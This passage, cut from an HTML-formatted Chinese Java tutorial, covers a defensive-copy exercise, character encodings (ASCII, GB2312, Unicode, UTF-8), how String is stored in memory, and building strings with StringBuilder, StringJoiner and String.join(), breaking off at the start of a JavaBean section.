s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Score</span><span class=\"token punctuation\">(</span>scores<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        s<span class=\"token punctuation\">.</span><span class=\"token function\">printScores</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        scores<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">99</span><span class=\"token punctuation\">;</span>\n        s<span class=\"token punctuation\">.</span><span class=\"token function\">printScores</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Score</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> scores<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Score</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> scores<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>scores <span class=\"token operator\">=</span> scores<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">printScores</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span>scores<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>观察两次输出，由于<code>Score</code>内部直接引用了外部传入的<code>int[]</code>数组，这会造成外部代码对<code>int[]</code>数组的修改，影响到<code>Score</code>类的字段。如果外部代码不可信，这就会造成安全隐患。</p>\n<p>请修复<code>Score</code>的构造方法，使得外部代码对数组的修改不影响<code>Score</code>实例的<code>int[]</code>字段。</p>\n<h3>字符编码</h3>\n<p>在早期的计算机系统中，为了给字符编码，美国国家标准学会（American National Standard Institute：ANSI）制定了一套英文字母、数字和常用符号的编码，它占用一个字节，编码范围从<code>0</code>到<code>127</code>，最高位始终为<code>0</code>，称为<code>ASCII</code>编码。例如，字符<code>'A'</code>的编码是<code>0x41</code>，字符<code>'1'</code>的编码是<code>0x31</code>。</p>\n<p>如果要把汉字也纳入计算机编码，很显然一个字节是不够的。<code>GB2312</code>标准使用两个字节表示一个汉字，其中第一个字节的最高位始终为<code>1</code>，以便和<code>ASCII</code>编码区分开。例如，汉字<code>'中'</code>的<code>GB2312</code>编码是<code>0xd6d0</code>。</p>\n<p>类似的，日文有<code>Shift_JIS</code>编码，韩文有<code>EUC-KR</code>编码，这些编码因为标准不统一，同时使用，就会产生冲突。</p>\n<p>为了统一全球所有语言的编码，全球统一码联盟发布了<code>Unicode</code>编码，它把世界上主要语言都纳入同一个编码，这样，中文、日文、韩文和其他语言就不会冲突。</p>\n<p><code>Unicode</code>编码需要两个或者更多字节表示，我们可以比较中英文字符在<code>ASCII</code>、<code>GB2312</code>和<code>Unicode</code>的编码：</p>\n<p>英文字符<code>'A'</code>的<code>ASCII</code>编码和<code>Unicode</code>编码：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>         ┌────┐\nASCII:   │ 41 │\n         └────┘\n         ┌────┬────┐\nUnicode: │ 00 │ 41 │\n         └────┴────┘\n</code></pre></div><p>英文字符的<code>Unicode</code>编码就是简单地在前面添加一个<code>00</code>字节。</p>\n<p>中文字符<code>'中'</code>的<code>GB2312</code>编码和<code>Unicode</code>编码：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>         ┌────┬────┐\nGB2312:  │ d6 │ d0 │\n         └────┴────┘\n         ┌────┬────┐\nUnicode: │ 4e │ 2d │\n         └────┴────┘\n</code></pre></div><p>那我们经常使用的<code>UTF-8</code>又是什么编码呢？因为英文字符的<code>Unicode</code>编码高字节总是<code>00</code>，包含大量英文的文本会浪费空间，所以，出现了<code>UTF-8</code>编码，它是一种变长编码，用来把固定长度的<code>Unicode</code>编码变成1～4字节的变长编码。通过<code>UTF-8</code>编码，英文字符<code>'A'</code>的<code>UTF-8</code>编码变为<code>0x41</code>，正好和<code>ASCII</code>码一致，而中文<code>'中'</code>的<code>UTF-8</code>编码为3字节<code>0xe4b8ad</code>。</p>\n<p><code>UTF-8</code>编码的另一个好处是容错能力强。如果传输过程中某些字符出错，不会影响后续字符，因为<code>UTF-8</code>编码依靠高字节位来确定一个字符究竟是几个字节，它经常用来作为传输编码。</p>\n<p>在Java中，<code>char</code>类型实际上就是两个字节的<code>Unicode</code>编码。如果我们要手动把字符串转换成其他编码，可以这样做：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b1 <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 按系统默认编码转换，不推荐</span>\n<span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b2 <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 按UTF-8编码转换</span>\n<span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b2 <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GBK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 按GBK编码转换</span>\n<span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b3 <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardCharsets</span><span class=\"token punctuation\">.</span><span class=\"token constant\">UTF_8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 按UTF-8编码转换</span>\n</code></pre></div><p>注意：转换编码后，就不再是<code>char</code>类型，而是<code>byte</code>类型表示的数组。</p>\n<p>如果要把已知编码的<code>byte[]</code>转换为<code>String</code>，可以这样做：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b <span class=\"token operator\">=</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token class-name\">String</span> s1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> <span class=\"token string\">\"GBK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 按GBK转换</span>\n<span class=\"token class-name\">String</span> s2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> <span class=\"token class-name\">StandardCharsets</span><span class=\"token punctuation\">.</span><span class=\"token constant\">UTF_8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 按UTF-8转换</span>\n</code></pre></div><p>始终牢记：Java的<code>String</code>和<code>char</code>在内存中总是以Unicode编码表示。</p>\n<h3>延伸阅读</h3>\n<p>对于不同版本的JDK，<code>String</code>类在内存中有不同的优化方式。具体来说，早期JDK版本的<code>String</code>总是以<code>char[]</code>存储，它的定义如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> value<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> offset<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> count<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>而较新的JDK版本的<code>String</code>则以<code>byte[]</code>存储：如果<code>String</code>仅包含ASCII字符，则每个<code>byte</code>存储一个字符，否则，每两个<code>byte</code>存储一个字符，这样做的目的是为了节省内存，因为大量的长度较短的<code>String</code>通常仅包含ASCII字符：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> value<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">byte</span> coder<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 0 = LATIN1, 1 = UTF16</span>\n</code></pre></div><p>对于使用者来说，<code>String</code>内部的优化不影响任何已有代码，因为它的<code>public</code>方法签名是不变的。</p>\n<h3>StringBuilder</h3>\n<p>Java编译器对<code>String</code>做了特殊处理，使得我们可以直接用<code>+</code>拼接字符串。</p>\n<p>考察下面的循环代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    s <span class=\"token operator\">=</span> s <span class=\"token operator\">+</span> <span class=\"token string\">\",\"</span> <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>虽然可以直接拼接字符串，但是，在循环中，每次循环都会创建新的字符串对象，然后扔掉旧的字符串。这样，绝大部分字符串都是临时对象，不但浪费内存，还会影响GC效率。</p>\n<p>为了能高效拼接字符串，Java标准库提供了<code>StringBuilder</code>，它是一个可变对象，可以预分配缓冲区，这样，往<code>StringBuilder</code>中新增字符时，不会创建新的临时对象：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">StringBuilder</span> sb <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token char\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> sb<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p><code>StringBuilder</code>还可以进行链式操作：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 链式操作</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> sb <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Mr \"</span><span class=\"token punctuation\">)</span>\n          <span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">)</span>\n          <span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"!\"</span><span class=\"token punctuation\">)</span>\n          <span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello, \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>sb<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>如果我们查看<code>StringBuilder</code>的源码，可以发现，进行链式操作的关键是，定义的<code>append()</code>方法会返回<code>this</code>，这样，就可以不断调用自身的其他方法。</p>\n<p>仿照<code>StringBuilder</code>，我们也可以设计支持链式操作的类。例如，一个可以不断增加的计数器：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 链式操作</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Adder</span> adder <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Adder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        adder<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n             <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n             <span class=\"token punctuation\">.</span><span class=\"token function\">inc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n             <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>adder<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Adder</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Adder</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        sum <span class=\"token operator\">+=</span> n<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Adder</span> <span class=\"token function\">inc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        sum <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>注意：对于普通的字符串<code>+</code>操作，并不需要我们将其改写为<code>StringBuilder</code>，因为Java编译器在编译时就自动把多个连续的<code>+</code>操作编码为<code>StringConcatFactory</code>的操作。在运行期，<code>StringConcatFactory</code>会自动把字符串连接操作优化为数组复制或者<code>StringBuilder</code>操作。</p>\n<p>你可能还听说过<code>StringBuffer</code>，这是Java早期的一个<code>StringBuilder</code>的线程安全版本，它通过同步来保证多个线程操作<code>StringBuffer</code>也是安全的，但是同步会带来执行速度的下降。</p>\n<p><code>StringBuilder</code>和<code>StringBuffer</code>接口完全相同，现在完全没有必要使用<code>StringBuffer</code>。</p>\n<h3>StringJoiner</h3>\n<p>要高效拼接字符串，应该使用<code>StringBuilder</code>。</p>\n<p>很多时候，我们拼接的字符串像这样：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 输出: Hello Bob, Alice, Grace!</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> names <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Alice\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Grace\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> sb <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name <span class=\"token operator\">:</span> names<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// 注意去掉最后的\", \":</span>\n        sb<span class=\"token punctuation\">.</span><span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>sb<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> sb<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>sb<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>类似用分隔符拼接数组的需求很常见，所以Java标准库还提供了一个<code>StringJoiner</code>来干这个事：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">StringJoiner</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> names <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Alice\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Grace\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> sj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringJoiner</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name <span class=\"token operator\">:</span> names<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            sj<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>sj<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>慢着！用<code>StringJoiner</code>的结果少了前面的<code>\"Hello \"</code>和结尾的<code>\"!\"</code>！遇到这种情况，需要给<code>StringJoiner</code>指定“开头”和“结尾”：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">StringJoiner</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> names <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Alice\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Grace\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> sj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringJoiner</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name <span class=\"token operator\">:</span> names<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            sj<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>sj<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>String.join()</h3>\n<p><code>String</code>还提供了一个静态方法<code>join()</code>，这个方法在内部使用了<code>StringJoiner</code>来拼接字符串，在不需要指定“开头”和“结尾”的时候，用<code>String.join()</code>更方便：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> names <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Alice\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Grace\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", \"</span><span class=\"token punctuation\">,</span> names<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><h2>JavaBean</h2>\n<p>在Java中，有很多<code>class</code>的定义都符合这样的规范：</p>\n<ul>\n<li>若干<code>private</code>实例字段；</li>\n<li>通过<code>public</code>方法来读写实例字段。</li>\n</ul>\n<p>例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> 